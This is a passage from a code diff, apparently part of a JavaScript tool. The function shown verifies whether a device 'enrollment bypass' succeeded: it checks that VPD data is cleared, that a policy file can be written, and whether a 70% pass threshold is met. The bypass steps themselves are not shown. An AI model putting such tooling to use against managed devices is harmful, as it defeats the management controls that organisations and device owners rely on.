+      checks.vpdCleared = vpdCheck.stdout.includes('not found') || vpdCheck.stdout.trim() === '';
+
+      // Check 6: Settings can be modified (test)
+      try {
+        const testPolicy = { 'TestSetting': true };
+        fs.writeFileSync('/tmp/.clay_test_policy.json', JSON.stringify(testPolicy));
+        const canWrite = fs.existsSync('/tmp/.clay_test_policy.json');
+        fs.unlinkSync('/tmp/.clay_test_policy.json');
+        checks.settingsModifiable = canWrite;
+      } catch {
+        checks.settingsModifiable = false;
+      }
+
+      // Overall success if majority of checks pass
+      const passedChecks = Object.values(checks).filter(Boolean).length;
+      const totalChecks = Object.keys(checks).length;
+      checks.overall = passedChecks >= Math.ceil(totalChecks * 0.7); // 70% threshold
+
+      return {
+        overall: checks.overall,
+        checks,
+        passedChecks,
+        totalChecks,
+        percentage: Math.round((passedChecks / totalChecks) * 100)
+      };
+    } catch (error) {
+      console.error('Failed to verify enrollment bypass:', error);
+      return {
+        overall: false,
+        error: error.message,
+        checks: {}
+      };
     }
   }
 }
